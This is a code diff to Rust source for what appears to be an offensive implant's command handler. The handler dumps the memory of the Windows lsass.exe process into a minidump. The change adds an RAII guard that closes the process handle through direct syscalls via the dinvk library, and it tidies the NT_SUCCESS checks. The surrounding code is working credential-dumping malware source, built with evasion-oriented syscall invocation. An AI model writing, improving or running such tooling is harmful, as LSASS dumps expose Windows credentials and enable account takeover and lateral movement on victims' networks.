@@ -5,6 +5,20 @@ use serde_json::{json, Value};
 
 use super::CommandHandler;
 
+#[cfg(target_os = "windows")]
+struct HandleGuard(*mut core::ffi::c_void);
+
+#[cfg(target_os = "windows")]
+impl Drop for HandleGuard {
+    fn drop(&mut self) {
+        if !self.0.is_null() {
+            unsafe {
+                let _ = dinvk::syscall!("NtClose", self.0);
+            }
+        }
+    }
+}
+
 pub struct LsassDumpHandler;
 
 impl CommandHandler for LsassDumpHandler {
@@ -15,8 +29,6 @@ impl CommandHandler for LsassDumpHandler {
 
 #[cfg(target_os = "windows")]
 fn execute_lsass_dump() -> Result<Value> {
-    use dinvk::winapis::NT_SUCCESS;
-
     let pid = find_lsass_pid()
         .ok_or_else(|| anyhow::anyhow!("lsass.exe not found in process list"))?;
 
@@ -31,14 +43,10 @@ fn execute_lsass_dump() -> Result<Value> {
         }
     };
 
-    let _nt_success = NT_SUCCESS; // ensure import is used
+    let _guard = HandleGuard(handle);
 
     let regions = enumerate_lsass_memory(handle)?;
     let memory = read_lsass_memory(handle, &regions)?;
-
-    unsafe {
-        let _ = dinvk::syscall!("NtClose", handle);
-    }
 
     let dump = build_minidump(memory);
 
@@ -132,6 +140,7 @@ fn open_lsass_handle(pid: u32) -> anyhow::Result<Handle> {
 fn enumerate_lsass_memory(handle: Handle) -> anyhow::Result<Vec<(u64, usize)>> {
     use core::ffi::c_void;
     use core::mem::size_of;
+    use dinvk::winapis::NT_SUCCESS;
 
     // Matches MEMORY_BASIC_INFORMATION layout for 64-bit Windows.
     #[repr(C)]
@@ -177,7 +186,7 @@ fn enumerate_lsass_memory(handle: Handle) -> anyhow::Result<Vec<(u64, usize)>> {
             )
         };
 
-        if st.map(|n| n >= 0) != Some(true) {
+        if st.map(NT_SUCCESS) != Some(true) {
             break;
         }
 
